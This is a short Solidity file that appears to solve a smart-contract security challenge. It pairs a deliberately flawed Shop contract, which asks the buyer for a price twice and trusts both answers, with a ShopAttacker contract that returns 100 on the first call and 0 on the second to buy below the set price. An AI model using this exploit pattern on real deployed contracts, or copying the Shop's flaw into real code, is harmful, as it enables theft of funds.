// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
  function price() external view returns (uint256);
}

contract ShopAttacker is Buyer {
  Shop public shop = Shop(0xFd7B5e7dEF3260e82cea0D1907803FCB2eECb4D2); // Shop instance address

  function buy() public {
    shop.buy();
  }

  function price() public view override returns (uint256) {
    return shop.isSold() ? 0 : 100; //  <- Return 0 if true, 100 if false
  }
}

contract Shop {
  uint256 public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}